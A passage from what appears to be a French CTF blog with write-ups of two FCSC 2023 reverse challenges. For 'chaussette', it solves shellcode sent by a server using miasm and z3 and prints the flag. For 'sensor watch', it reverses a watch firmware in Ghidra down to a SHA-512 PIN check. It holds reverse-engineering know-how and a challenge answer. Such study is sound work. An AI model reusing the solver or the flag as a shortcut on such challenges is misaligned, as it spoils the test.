TranslatorZ3 from miasm.arch.x86.lifter_model_call import LifterModelCall_x86_64 from miasm.analysis.simplifier import * from miasm.expression.simplifications import expr_simp, ExpressionSimplifier from z3 import * import re def solve_shellcode(shellcode): # on créé une nouvelle location pour notre shellcode loc_db = LocationDB() # on load notre shellcode (nos bytes code) container = Container.from_string(shellcode, loc_db) machine = Machine(\u0026#39;x86_64\u0026#39;) ira = machine.lifter(loc_db) dis_engine = machine.dis_engine(container.bin_stream, loc_db=loc_db) start_addres = 0 # https://github.com/cea-sec/miasm/blob/master/doc/ir/lift.ipynb asm_cfg = dis_engine.dis_multiblock(start_addres) ira_cfg = ira.new_ircfg_from_asmcfg(asm_cfg) \u0026#34;\u0026#34;\u0026#34; # on peut utiliser ce bout de code pour afficher les instructions assembleurs. for block in asm_cfg.blocks: print(block) \u0026#34;\u0026#34;\u0026#34; init_state = {} # on definit ici RDI qui va contenir la valeur en entrée. init_state[ExprId(\u0026#34;RDI\u0026#34;, 64)] = ExprId(\u0026#39;input\u0026#39;, 64) # rax qui est censé être égal à 0 à la fin du script. init_state[ExprId(\u0026#34;RAX\u0026#34;, 64)] = ExprId(\u0026#39;result\u0026#39;, 64) # on lance l\u0026#39;execution symbolique. sb = SymbolicExecutionEngine(LifterModelCall_x86_64(loc_db) , state=init_state) sb.run_at(ira_cfg, addr=start_addres) # on va transformer l\u0026#39;expression symbolique en contraintes pour z3 trans = TranslatorZ3(loc_db=loc_db) # solveur basique z3 s = Solver() # on utilise miasm pour simplifier les expressions symboliques (on aurait pu faire sans pour ce chall) expr_simp_cond = ExpressionSimplifier() expr_simp_cond.enable_passes(ExpressionSimplifier.PASS_COND) # récuperer l\u0026#39;expression symbolique (+ la simplifiée.) expr_rax = sb.eval_expr(expr_simp(expr_simp_cond(ExprId(\u0026#39;RAX\u0026#39;, 64)))) # on solve avec z3 s.add(trans.from_expr(expr_rax) == trans.from_expr(ExprInt(0, 64))) if s.check() == sat: # print(\u0026#34;found\u0026#34;) model = s.model() # on retourne le resultat # (j\u0026#39;ai honte de mon parsing mais je n\u0026#39;arrivais pas récuperer cette valeur correctement ...) return int(re.findall(\u0026#34;[0-9]+\u0026#34;, str(model))[0]) else: print(\u0026#34;[-] fail\u0026#34;) return 0 # on ouvre le fichier contenant les octets de notre code assembleur with open(\u0026#34;bytcodes_function\u0026#34;, \u0026#34;rb\u0026#34;) as file: content = file.read() result = solve_shellcode(content) if result: print(f\u0026#34;[+] solution found : {result}\u0026#34;) On va donc executer notre programme et l\u0026rsquo;on récupère bel et bien une valeur.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ python3 solve_first_shellcode.py\r[+] solution found : 14171339039947875846 On peut entrer ces valeurs dans notre binaire et effectivemment notre script passe la première condition avec succès !\nVous croyez que c\u0026rsquo;était fini ? c\u0026rsquo;est que le début. On passe donc à la deuxième fonction. Comme précédemment, on place notre breakpoint avant l\u0026rsquo;appel à la fonction et on l\u0026rsquo;affiche.\n(gdb) b*0x000055555555612c\rBreakpoint 1 at 0x55555555612c\r(gdb) run\rStarting program: /home/user/shared/fcsc2023/reverse/chaussette-xs/chaussette-xs\r[Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/usr/lib/libthread_db.so.1\u0026#34;.\r14171339039947875846\r123\rBreakpoint 1, 0x000055555555612c in ?? ()\r(gdb) x/i $rip\r=\u0026gt; 0x55555555612c: call 0x555555557000\r(gdb) x/110i 0x555555557000\r0x555555557000: movabs rax,0x676e656c6c616863\r0x55555555700a: push r15\r0x55555555700c: push r14\r0x55555555700e: push r13\r0x555555557010: push r12\r0x555555557012: push rbp\r0x555555557013: push rbx\r0x555555557014: mov rbx,rdi\r0x555555557017: lea rdi,[rip+0xfea] # 0x555555558008\r0x55555555701e: sub rsp,0x68\r0x555555557022: movdqa xmm0,XMMWORD PTR [rip+0xfe6] # 0x555555558010\r0x55555555702a: mov QWORD PTR [rsp+0x8],rsi\r0x55555555702f: movups XMMWORD PTR [rsp+0x30],xmm0\r0x555555557034: movdqa xmm0,XMMWORD PTR [rip+0xfe4] # 0x555555558020\r0x55555555703c: mov QWORD PTR [rsp],rdx\r0x555555557040: mov QWORD PTR [rsp+0x50],rax\r0x555555557045: mov DWORD PTR [rsp+0x58],0x72662e65\r0x55555555704d: mov BYTE PTR [rsp+0x5c],0x0\r0x555555557052: movups XMMWORD PTR [rsp+0x40],xmm0\r0x555555557057: call 0x5555555550a0 \u0026lt;getprotobyname@plt\u0026gt;\r0x55555555705c: test rax,rax\r0x55555555705f: je 0x5555555571bf\r0x555555557065: mov edx,DWORD PTR [rax+0x10]\r0x555555557068: mov esi,0x1\r0x55555555706d: mov edi,0x2\r0x555555557072: call 0x5555555550f0 \u0026lt;socket@plt\u0026gt;\r0x555555557077: mov DWORD PTR [rip+0x313b],eax # 0x55555555a1b8\r0x55555555707d: cmp eax,0xffffffff\r0x555555557080: je 0x5555555571bf\r0x555555557086: lea rdi,[rsp+0x30]\r0x55555555708b: call 0x555555555090 \u0026lt;gethostbyname@plt\u0026gt;\r0x555555557090: test rax,rax\r0x555555557093: je 0x5555555571bf\r0x555555557099: mov rax,QWORD PTR [rax+0x18]\r0x55555555709d: mov rax,QWORD PTR [rax]\r0x5555555570a0: mov edi,DWORD PTR [rax]\r0x5555555570a2: call 0x555555555050 \u0026lt;inet_ntoa@plt\u0026gt;\r0x5555555570a7: mov rdi,rax\r0x5555555570aa: call 0x555555555080 \u0026lt;inet_addr@plt\u0026gt;\r0x5555555570af: cmp eax,0xffffffff\r0x5555555570b2: je 0x5555555571bf\r0x5555555570b8: mov edi,DWORD PTR [rip+0x30fa] # 0x55555555a1b8\r0x5555555570be: lea rsi,[rsp+0x20]\r0x5555555570c3: mov DWORD PTR [rsp+0x24],eax\r0x5555555570c7: mov edx,0x10\r0x5555555570cc: mov DWORD PTR [rsp+0x20],0xcd080002\r0x5555555570d4: call 0x5555555550e0 \u0026lt;connect@plt\u0026gt;\r0x5555555570d9: cmp eax,0xffffffff\r0x5555555570dc: je 0x5555555571bf\r0x5555555570e2: lea r12,[rsp+0x18]\r0x5555555570e7: lea r13,[rsp+0x10]\r0x5555555570ec: lea r14,[rsp+0x8]\r0x5555555570f1: nop DWORD PTR [rax+0x0]\r0x5555555570f8: mov rax,QWORD PTR [rsp+0x8]\r0x5555555570fd: mov edi,DWORD PTR [rip+0x30b5] # 0x55555555a1b8\r0x555555557103: mov edx,0x8\r0x555555557108: mov rsi,r12\r0x55555555710b: mov QWORD PTR [rsp+0x18],rax\r0x555555557110: call 0x555555555040 \u0026lt;write@plt\u0026gt;\r0x555555557115: mov rax,QWORD PTR [rsp]\r0x555555557119: mov edx,0x8\r0x55555555711e: mov rsi,r12\r0x555555557121: mov edi,DWORD PTR [rip+0x3091] # 0x55555555a1b8\r0x555555557127: mov QWORD PTR [rsp+0x18],rax\r0x55555555712c: call 0x555555555040 \u0026lt;write@plt\u0026gt;\r0x555555557131: mov edi,DWORD PTR [rip+0x3081] # 0x55555555a1b8\r0x555555557137: mov edx,0x8\r0x55555555713c: mov rsi,r13\r0x55555555713f: call 0x555555555070 \u0026lt;read@plt\u0026gt;\r0x555555557144: mov rbp,QWORD PTR [rsp+0x10]\r0x555555557149: cmp rbp,0xffffffffffffffff\r0x55555555714d: je 0x5555555571ce\r0x55555555714f: mov r15,rbx\r0x555555557152: test rbp,rbp\r0x555555557155: jne 0x55555555716e\r0x555555557157: jmp 0x555555557189\r0x555555557159: nop DWORD PTR [rax+0x0]\r0x555555557160: add r15,rax\r0x555555557163: mov rax,r15\r0x555555557166: sub rax,rbx\r0x555555557169: cmp rax,rbp\r0x55555555716c: jae 0x555555557189\r0x55555555716e: mov edi,DWORD PTR [rip+0x3044] # 0x55555555a1b8\r0x555555557174: xor ecx,ecx\r0x555555557176: mov edx,0x1000\r0x55555555717b: mov rsi,r15\r0x55555555717e: call 0x555555555030 \u0026lt;recv@plt\u0026gt;\r0x555555557183: cmp rax,0xffffffffffffffff\r0x555555557187: jne 0x555555557160\r0x555555557189: mov rsi,r14\r0x55555555718c: lea rdi,[rip+0xe71] # 0x555555558004\r0x555555557193: xor eax,eax\r0x555555557195: call 0x5555555550d0 \u0026lt;__isoc99_scanf@plt\u0026gt;\r0x55555555719a: mov rsi,rsp\r0x55555555719d: lea rdi,[rip+0xe60] # 0x555555558004\r0x5555555571a4: xor eax,eax\r0x5555555571a6: call 0x5555555550d0 \u0026lt;__isoc99_scanf@plt\u0026gt;\r0x5555555571ab: mov rsi,QWORD PTR [rsp]\r0x5555555571af: mov rdi,QWORD PTR [rsp+0x8]\r0x5555555571b4: call rbx\r0x5555555571b6: test rax,rax\r0x5555555571b9: je 0x5555555570f8\r0x5555555571bf: add rsp,0x68\r0x5555555571c3: pop rbx\r0x5555555571c4: pop rbp\r0x5555555571c5: pop r12\r0x5555555571c7: pop r13\r0x5555555571c9: pop r14\r0x5555555571cb: pop r15\r0x5555555571cd: ret cette fonction peut paraître effrayante aux premiers abords, mais elle est en réalité plutôt simple. On peut d\u0026rsquo;abord voir les appels aux fonctions de la libc tels que socket, connect, recv etc.\nElle va établir une connexion tcp avec un serveur distant, lui envoyer nos 2 valeurs entrées précédemment et récuperer des données que le serveur lui envoie. Les octets que la fonction récupère vont être placés à l\u0026rsquo;addresse de notre précédente fonction. Ensuite le programme va demander à nouveau 2 entrées à l\u0026rsquo;utilisateur et appeler notre nouvelle fonction avec les valeurs données par l\u0026rsquo;utlisateur et recommencer.\nOn pourrait représenter le fonctionnement de cette fonction par le pseudo code suivant :\nvoid strange_function(char* shellcode, ulong value1, ulong value2) { conn = connexion(); // établit une connexion tcp avec le serveur while (1) { size = read(conn, 8); // lit 8 octets qui seront la taille du shellcode *shellcode = recv(conn) // reçois le shellcode et l\u0026#39;écris à // l\u0026#39;addresse de l\u0026#39;ancien shellcode // récupère les 2 entrées utilisateur scanf(\u0026#34;%lu\u0026#34;, \u0026amp;value1); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;value2); // verifie que les entrées résolve le shellcode. // pareil que la première partie du challenge. if ((*(void(*)())shellcode)(value1, value2) != 0) { // signifie que notre entrée est fausse // le programme se stoppe. (et donc par conséquent pas de flag) return; } } } On va donc récuperer l\u0026rsquo;IP et le port afin de créer nous même la connexion tcp avec le serveur distant, lui envoyer nos valeurs et récuperer les shellcodes.\nPour récuperer l\u0026rsquo;ip et le port on pourrait placer un point d\u0026rsquo;arret au niveau de l\u0026rsquo;appel à la fonction getprotobyname et au niveau de la fonction socket . Mais étant flemmard (ou malin à vous de me dire) j\u0026rsquo;ai préféré regarder les connexions ouvertes sur ma machine par le processus en question.\nPour ce faire j\u0026rsquo;ai utilisé l\u0026rsquo;outil ss. J\u0026rsquo;execute donc mon binaire, je lui donne les valeurs trouvé précedemment afin qu\u0026rsquo;il établisse la connexion et ensuite avec la commande ss -nap | grep chaussette-xs je récupère l\u0026rsquo;ip et le port.\nLe serveur distant se trouve donc en 51.254.115.216:2253.\nRésoudre les shellcode avec miasm Après quelques tests on s\u0026rsquo;aperçoit qu\u0026rsquo;a chaque connexion le code renvoyé par le serveur change. On va donc implémenter un algorithme qui resout les fonctions donnée par le serveur distant.\nHeureusement nous avons déjà fait une grande partie du travail, en effet nous avons implémenté durant la première partie une fonction qui utilise miasm afin de résoudre les shellcodes. Nous avons donc a configurer la connexion avec le serveur et ensuite résoudre les instructions que le serveur nous enverra.\nVoici mon code :\nfrom pwn import * from miasm.analysis.machine import Machine from miasm.core.locationdb import LocationDB from miasm.analysis.binary import Container from miasm.expression.expression import * from miasm.ir.symbexec import SymbolicExecutionEngine from miasm.ir.translators.z3_ir import TranslatorZ3 from miasm.arch.x86.lifter_model_call import LifterModelCall_x86_64 from miasm.analysis.simplifier import * from miasm.expression.simplifications import expr_simp, ExpressionSimplifier from z3 import * import re def solve_shellcode(shellcode): # on créé une nouvelle location pour notre shellcode loc_db = LocationDB() # on load notre shellcode container = Container.from_string(shellcode, loc_db) machine = Machine(\u0026#39;x86_64\u0026#39;) ira = machine.lifter(loc_db) dis_engine = machine.dis_engine(container.bin_stream, loc_db=loc_db) start_addres = 0 # https://github.com/cea-sec/miasm/blob/master/doc/ir/lift.ipynb asm_cfg = dis_engine.dis_multiblock(start_addres) ira_cfg = ira.new_ircfg_from_asmcfg(asm_cfg) \u0026#34;\u0026#34;\u0026#34; # on peut utiliser ce bout de code pour afficher les instructions assembleurs. for block in asm_cfg.blocks: print(block) \u0026#34;\u0026#34;\u0026#34; init_state = {} # on definit ici RDI qui va contenir la valeur en entrée. init_state[ExprId(\u0026#34;RDI\u0026#34;, 64)] = ExprId(\u0026#39;input\u0026#39;, 64) # rax qui est censé être égal à 0 à la fin du script. init_state[ExprId(\u0026#34;RAX\u0026#34;, 64)] = ExprId(\u0026#39;result\u0026#39;, 64) # on lance l\u0026#39;execution symbolique. sb = SymbolicExecutionEngine(LifterModelCall_x86_64(loc_db) , state=init_state) sb.run_at(ira_cfg, addr=start_addres) # on va transformer l\u0026#39;expression symbolique en contraintes pour z3 trans = TranslatorZ3(loc_db=loc_db) # solveur basique z3 s = Solver() # on utilise miasm pour simplifier les expressions symboliques (on aurait pu faire sans pour ce chall) expr_simp_cond = ExpressionSimplifier() expr_simp_cond.enable_passes(ExpressionSimplifier.PASS_COND) # récuperer l\u0026#39;expression symbolique (+ la simplifiée.) expr_rax = sb.eval_expr(expr_simp(expr_simp_cond(ExprId(\u0026#39;RAX\u0026#39;, 64)))) # on solve avec z3 s.add(trans.from_expr(expr_rax) == trans.from_expr(ExprInt(0, 64))) if s.check() == sat: # print(\u0026#34;found\u0026#34;) model = s.model() return int(re.findall(\u0026#34;[0-9]+\u0026#34;, str(model))[0]) else: print(\u0026#34;[-] fail\u0026#34;) print(shellcode) return 0 # j\u0026#39;ai placé mon breakpoint au final, je trouvai un hostname plus joli host = \u0026#34;challenges.france-cybersecurity-challenge.fr\u0026#34; port = 2253 data_1 = 14171339039947875846 data_2 = 0xdeadbeef # useless # on etablit la connection tcp. p = remote(host, port) compteur = 0 while 1: # on envoie notre solution ainsi que celle inutile pour ce challenge. p.send(data_1.to_bytes(8, \u0026#34;little\u0026#34;)) p.send(data_2.to_bytes(8, \u0026#34;little\u0026#34;)) size = int.from_bytes(p.recv(8), \u0026#34;little\u0026#34;) shellcode = b\u0026#34;\u0026#34; print(f\u0026#34;[~] shellcode of {size} bytes\u0026#34;) shellcode = p.recv(size) flag = re.findall(b\u0026#34;FCSC{.*}\u0026#34;, shellcode) if flag: print(\u0026#34;flag is : \u0026#34;, end=\u0026#34;\u0026#34;) print(flag[0].decode()) exit() print(f\u0026#34;[~] solving shellcode {compteur}...\u0026#34;) result = solve_shellcode(shellcode) if result: data_1 = result print(f\u0026#34;[+] solution found : {data_1}\u0026#34;) compteur += 1 else: exit(1) # on ferme la connection p.close() Ce code va établir une connexion avec le serveur et tant qu\u0026rsquo;il ne trouve pas le flag dans les fonctions qu\u0026rsquo;il reçoit il va les résoudre et renvoyer la solution. Je ne pense pas qu\u0026rsquo;il est nécessaire que j\u0026rsquo;explique mon script en détail, il est très similaire au précédent.\nOn execute donc le script et au bout de quelques secondes le flag apparait.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ python3 solving_using_miasm.py\r[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2253: Done\r[~] shellcode of 414 bytes\r[~] solving shellcode 0...\r[+] solution found : 16584048833465228239\r[~] shellcode of 444 bytes\r[~] solving shellcode 1...\r[+] solution found : 5460636808995531285\r[~] shellcode of 842 bytes\r[~] solving shellcode 2...\r[+] solution found : 3445377768356975671\r[~] shellcode of 810 bytes\r[~] solving shellcode 3...\r[+] solution found : 6412023629681526002\r[~] shellcode of 929 bytes\r[~] solving shellcode 4...\r[+] solution found : 1172201077721270149\r[~] shellcode of 18446744073709551615 bytes\rflag is : FCSC{2a86d6edc5d08afc03d2c9ef3e2ff83cd63e520ffbd716d96479df8147e6da5e}\r[*] Closed connection to challenges.france-cybersecurity-challenge.fr port 2253 Pour conclure J\u0026rsquo;ai trouvé ce challenge très intéressant, j\u0026rsquo;ai malheureusement été bloqué par son grand frère durant plusieurs jours sans le réussir. Il m\u0026rsquo;a néanmoins appris beaucoup de choses sur l\u0026rsquo;automatisation de l\u0026rsquo;analyse binaire. En effet j\u0026rsquo;ai toujours cru que les outils tels que angr, miasm et tout les solveurs de ce genre était pour les personnes qui ne voulaient pas réfléchir. C\u0026rsquo;était donc la première fois que j\u0026rsquo;utilisais miasm (et angr) et j\u0026rsquo;ai trouvé ça très intéressant. Cela m\u0026rsquo;a permis d\u0026rsquo;aborder un nouvel aspect du reverse engineering qui m\u0026rsquo;a l\u0026rsquo;air très complexe mais également très intéressant.\n","permalink":"https://trikkss.github.io/posts/fcsc2023_chaussette-xs/","summary":"Write up du challenge chaussette (XS).","title":"FCSC 2023 - chaussette (XS)"},{"content":"vous pouvez retrouver les fichiers joint avec le chall ici\nDécouverte du challenge Pour ce challenge 2 fichiers nous ont été donnés, un dossier compressé contenant un emulateur ainsi qu\u0026rsquo;un dump de la flash d\u0026rsquo;une montre.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ file watch.uf2\rwatch.uf2: UF2 firmware image, file size 00000000, address 0x002000, 360 total blocks après quelques recherches sur le format de fichier on comprend que c\u0026rsquo;est un format dévellopé par microsoft afin de flasher des micro controleur\ngithub.com/microsoft/uf2 on trouve sur ce même github un script python permettant packer et à la fois d\u0026rsquo;unpacker des fichiers UF2.\nuf2/uf2conv.md on va donc télécharger ce script et extraire le firmware.\nwget https://github.com/microsoft/uf2/raw/master/utils/uf2conv.py\rwget https://github.com/microsoft/uf2/raw/master/utils/uf2families.json Une fois téléchargé on va pouvoir récuperer notre firmware avec la commande :\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ python3 uf2conv.py watch.uf2 --convert --output firmware.bin 1 ↵\r--- UF2 File Header Info ---\rAll block flag values consistent, 0x0000\r----------------------------\rConverted to bin, output size: 92160, start address: 0x2000\rWrote 92160 bytes to firmware.bin Dans l\u0026rsquo;archive \u0026ldquo;émulateur\u0026rdquo;, on peut trouver un docker contenant un fichier web-assembly qui semble émuler notre montre.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ tar -xvf emulateur.tar.gz\remulateur/\remulateur/src/\remulateur/src/favicon.ico\remulateur/src/watch.html\remulateur/src/watch.js\remulateur/src/watch.wasm\remulateur/docker-compose.yml\remulateur/Dockerfile\remulateur/README.md On peut lancer l\u0026rsquo;émulateur avec la commande docker-compose up et se rendre sur la page http://localhost:8000/watch.html\nOn joue un peu avec l\u0026rsquo;émulateur et on tombe rapidemment sur une interface \u0026ldquo;PIN\u0026rdquo; qui semble prendre en entrée un code PIN en incrémentant les chiffres présents sur le cadran de la montre.\nSi l\u0026rsquo;on tente de rentrer un mot de passe la montre nous répond \u0026ldquo;BADPIN\u0026rdquo;\nSensor Watch Après quelques recherches sur le modèle de la montre CASIO F-91W, un nom revient très souvent : celui de Joey Castillo.\nEn effet je tombe sur un github intéressant : GitHub - joeycastillo/Sensor-Watch\nJe n\u0026rsquo;ai pas remarqué de suite, mais ce github porte le nom du challenge ! On est donc sur la bonne voie.\nEn parcourant le github on comprend que la Sensor Watch est une carte de remplacement pour la montre Casio F-91W sur laquelle on peut intégrer en quelque sorte des mods etc.\nOn peut d\u0026rsquo;ailleurs y retrouver notre émulateur quand on jette un oeil au framework Movement.\nOn a le code source du framework utilisé !\nOn peut donc maintenant passer au passer au reverse engineering de notre montre.\nReverse engineering Afin de decompiler le firmware je vais utiliser le framework ghidra.\nOn peut lire sur le github de la sensor watch :\nARM Cortex M0+ microcontroller Afin d\u0026rsquo;en savoir plus on cherche la datasheet du micro controleur. https://www.st.com/resource/en/datasheet/stm32g081rb.pdf\nOn est donc sur de l\u0026rsquo;ARM compilé en 32 bits.\nl\u0026rsquo;outil binbloom peut lui aussi nous donner des informations à propos du firmware.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/sensor_watch/writeup\r╰─➤ binbloom -a 32 firmware.bin 255 ↵\r[i] 32-bit architecture selected.\r[i] File read (92160 bytes)\r[i] Endianness is LE\r[i] 143 strings indexed\r[i] Found 580 base addresses to test\r[i] Base address found (valid array): 0x00002000.\rMore base addresses to consider (just in case):\r0x1ffeb000 (0.03)\r0x1fff8000 (0.01)\r0x46bfa000 (0.00)\r0x001fb000 (0.00) Cet outil nous apprend que les octets dans le firmware sont en little endian et nous propose des addresse de bases afin de mapper correctement notre binaire.\nOn est donc maintenant prêt à charger notre firmware dans Ghidra.\nUne fois notre binaire chargé on va aller dans Window -\u0026gt; Memory Map et cliquer sur la petite maison afin de modifier l\u0026rsquo;addresse de base du binaire.\net l\u0026rsquo;on va la mettre à 0x2000. A ce moment là vous vous rendrez compte que ghidra vous a maintenant trouvé plein de fonctions. En effet, grâce à l\u0026rsquo;addresse de base les fonctions ainsi que les symboles présents dans le binaire vont pouvoir être résolus par notre désassembleur car ils seront à leur addresse correcte. Je vous conseille tout de même de lancer à nouveau une auto-analyse du firmware ainsi qu\u0026rsquo;un \u0026ldquo;ARM agressive instruction finder\u0026rdquo;.\nCommençons donc à investiguer.\nPour ma part j\u0026rsquo;ai d\u0026rsquo;abord commencé par regarder les chaines de caractères présentes dans le binaire. Certaines telles que \u0026ldquo;BADPIN\u0026rdquo;, \u0026ldquo;PI N%c%c%c%c%c%c\u0026rdquo;\nA la suite de ça on peut trouver les fonctions qui utilise ces chaines de caractère.\nOn trouve cette fonction qui fait reference à la chaine \u0026ldquo;BADPIN\u0026rdquo; :\nundefined8 UndefinedFunction_0000b308(uint param_1,uint param_2,char *param_3) { int iVar1; undefined *puVar2; char cVar3; char extraout_r1; int extraout_r1_00; int iVar4; uint uStack_14; iVar1 = DAT_0000b3fc; uStack_14 = param_2 \u0026amp; 0xffff0000 | param_1 \u0026amp; 0xffff; switch(param_1 \u0026amp; 0xff) { case 1: if (*param_3 != \u0026#39;\\0\u0026#39;) break; goto LAB_0000b376; case 2: cVar3 = *param_3; if (cVar3 == \u0026#39;\\0\u0026#39;) { if ((int)((uStack_14 \u0026gt;\u0026gt; 8) \u0026lt;\u0026lt; 0x1f) \u0026lt; 0) { cVar3 = param_3[2] + \u0026#39;\\x04\u0026#39;; puVar2 = DAT_0000b3f8; LAB_0000b340: FUN_00005a84(puVar2,cVar3); break; } } else if (cVar3 == \u0026#39;\\x01\u0026#39;) { FUN_00006a88(param_3 + 3,6,DAT_0000b3fc,0); iVar4 = 0; do { if (PTR_DAT_0000b400[iVar4] != (*(byte *)(iVar1 + iVar4) ^ 0x15)) { cVar3 = \u0026#39;\\0\u0026#39;; goto LAB_0000b370; } iVar4 = iVar4 + 1; } while (iVar4 != 0x40); cVar3 = \u0026#39;\\x01\u0026#39;; LAB_0000b370: *param_3 = \u0026#39;\\x03\u0026#39; - cVar3; } else { if (cVar3 != \u0026#39;\\x03\u0026#39;) { if (cVar3 != \u0026#39;\\x02\u0026#39;) break; cVar3 = \u0026#39;\\0\u0026#39;; puVar2 = PTR_DAT_0000b408; goto LAB_0000b340; } FUN_0000e31c(param_3 + 3,PTR_s_BADPIN_0000b404); param_3[1] = \u0026#39;\\0\u0026#39;; param_3[2] = \u0026#39;\\0\u0026#39;; } LAB_0000b376: FUN_0000b29c(param_3); break; default: FUN_0000a700(uStack_14); break; case 5: FUN_0000a6c4(0); break; case 6: if (*param_3 == \u0026#39;\\0\u0026#39;) { if ((byte)param_3[2] == 5) { *param_3 = \u0026#39;\\x01\u0026#39;; } FUN_0000b744((byte)param_3[2] + 1,6); param_3[2] = extraout_r1; param_3[1] = \u0026#39;\\0\u0026#39;; } break; case 0xe: if (*param_3 == \u0026#39;\\0\u0026#39;) { FUN_0000b744((byte)param_3[1] + 1,10); puVar2 = PTR_s_0123456789_0000b40c; param_3[1] = (char)extraout_r1_00; param_3[(byte)param_3[2] + 3] = puVar2[extraout_r1_00]; } } return CONCAT44(param_1,1); } Malheureusement elle n\u0026rsquo;est pas très compréhensible.\nSachant que nous avons une partie du code source de notre firmware, nous pouvons nous en servir afin de retrouver des symboles.\nJ\u0026rsquo;ai donc procédé de la même manière suivante, pour chaque fonctions présentes dans le code source de la Sensor-Watch et en particulier du framework movement, je modifie le nom de la fonction.\nQuelques exemples de fonctions que j\u0026rsquo;ai utilisé sont :\napp_init\napp_loop\nfile_system_init\nfilesystem_process_command\nfile_system_write_file\n\u0026hellip;\nGrâce à cela, j\u0026rsquo;ai pu retrouver plusieurs symboles et avoir une meilleure compréhension de notre fonction.\nLa documentation de Movement fût également d\u0026rsquo;une grande aide :\nSensor-Watch/README.md at main · joeycastillo/Sensor-Watch · GitHub\nOn comprend donc que le code trouvé précedemment équivaut à la fonction face_loop\nEn s\u0026rsquo;aidant de cette page de documentation, de quelques exemples présent sur le github ainsi que des symboles que l\u0026rsquo;on a résolu je réussis à réécrire un code un peu plus compréhensible.\nundefined8 face_loop(event_type event,astruct_1 *param_2,struct_context *context) { undefined *puVar1; char cVar2; uchar extraout_r1; int extraout_r1_00; int iVar3; uint local_14; int state; buffer = DAT_0000b3fc; local_14 = (uint)param_2 \u0026amp; 0xffff0000 | (uint)(ushort)event; switch(event.event_type) { case \u0026#39;\\x01\u0026#39;: if (context-\u0026gt;action != \u0026#39;\\0\u0026#39;) break; goto LAB_0000b376; case \u0026#39;\\x02\u0026#39;: /* si context-\u0026gt; action n\u0026#39;est pas égal à 0 on va appeler */ cVar2 = context-\u0026gt;action; if (cVar2 == \u0026#39;\\0\u0026#39;) { if ((int)((local_14 \u0026gt;\u0026gt; 8) \u0026lt;\u0026lt; 0x1f) \u0026lt; 0) { cVar2 = context-\u0026gt;index + \u0026#39;\\x04\u0026#39;; puVar1 = DAT_0000b3f8; LAB_0000b340: watch_display_string(puVar1,cVar2); break; } } else if (cVar2 == \u0026#39;\\x01\u0026#39;) { /* on dirait qu\u0026#39;il va mettre des données à l\u0026#39;adresse de DAT_0000b3fc et va ensuite itérer dessus en faisait un xor 0x15 sur chaque valeur à cette addresse et la comparer avec des valeurs d\u0026#39;une array de 64 bytes */ unknow_function(context-\u0026gt;PIN,6,DAT_0000b3fc,0); iVar3 = 0; do { if (PTR_DAT_0000b400[iVar3] != (*(byte *)(state + iVar3) ^ 0x15)) { cVar2 = \u0026#39;\\0\u0026#39;; goto LAB_0000b370; } iVar3 = iVar3 + 1; } while (iVar3 != 0x40); cVar2 = \u0026#39;\\x01\u0026#39;; LAB_0000b370: context-\u0026gt;action = \u0026#39;\\x03\u0026#39; - cVar2; } else { if (cVar2 != \u0026#39;\\x03\u0026#39;) { if (cVar2 != \u0026#39;\\x02\u0026#39;) break; cVar2 = \u0026#39;\\0\u0026#39;; puVar1 = FCSC; goto LAB_0000b340; } maybe_print(context-\u0026gt;PIN,PTR_s_BADPIN_0000b404); context-\u0026gt;ticks = \u0026#39;\\0\u0026#39;; context-\u0026gt;index = \u0026#39;\\0\u0026#39;; } LAB_0000b376: update_cadran(context); break; default: movement_default_loop_handler(local_14); break; case \u0026#39;\\x05\u0026#39;: FUN_0000a6c4(0); break; case \u0026#39;\\x06\u0026#39;: /* bouton en haut à gauche de la montre, on incrémente notre index et si il est égal à 5 on passe context à 1 */ if (context-\u0026gt;action == \u0026#39;\\0\u0026#39;) { if (context-\u0026gt;index == 5) { context-\u0026gt;action = \u0026#39;\\x01\u0026#39;; } FUN_0000b744(context-\u0026gt;index + 1,6); context-\u0026gt;index = extraout_r1; context-\u0026gt;ticks = \u0026#39;\\0\u0026#39;; } break; case \u0026#39;\\x0e\u0026#39;: if (context-\u0026gt;action == \u0026#39;\\0\u0026#39;) { /* incremente le password à la position password[param[2]] (bouton en bas à droite) */ FUN_0000b744(context-\u0026gt;ticks + 1,10); puVar1 = PTR_s_0123456789_0000b40c; /* PTR_s_0123456789_0000b40c pointe vers \u0026#34;0123456789\u0026#34; */ context-\u0026gt;ticks = (uchar)extraout_r1_00; context-\u0026gt;PIN[context-\u0026gt;index] = puVar1[extraout_r1_00]; } } return CONCAT44((uint)(ushort)event,1); } J\u0026rsquo;ai aussi réimplémenter les structures suivantes :\nstruct struct_context { uint8 ticks; uint8 index; char PIN[6] } struct event_type { uint8 no_idea; uint8 event; } la structure contexte contient le code PIN entré ainsi que l\u0026rsquo;index du code PIN que l\u0026rsquo;on est actuellement en train de modifier.\nLa structure event contient l\u0026rsquo;action réalisé par l\u0026rsquo;utilisateur.\nA partir de là, le code reste plutôt sale mais j\u0026rsquo;espère que vous le comprendrez aussi grâce à mes commentaires.\nA partir de là une chose était sure pour moi. Il fallait qu\u0026rsquo;une fois unknow_function était appelée avec en paramètre notre PIN ainsi que sa taille DAT_0000b3fc soit égal au 64 bytes présent à l\u0026rsquo;addresse PTR_DAT_0000b400 xor par 15.\nJe me suis donc mis à reverse la fonction unknow function pendant un très long moment sans comprendre son fonctionnement.\nPuis une idée m\u0026rsquo;est venue, googler les constantes ! Et effectivemment on tombe rapidemment sur des liens parlant de sha512.\nA ce moment là, tout deviens plus clair. En effet la taille d\u0026rsquo;un hash sha512 est de 64 bytes ! On cherche donc un peu et on retrouve dans le code source de la Sensor Watch notre fonction de hashage.\nJe récupère donc le tableau de 64 bytes\n[ 0xe3, 0x1e, 0x2c, 0x61, 0x36, 0xbd, 0xa8, 0xc0, 0x53, 0xf0, 0xf4, 0x45, 0x91, 0x88, 0x0b, 0xa7, 0x86, 0x39, 0x35, 0xd8, 0xb3, 0xc9, 0x7a, 0x3c, 0xca, 0xdf, 0xdd, 0xc2, 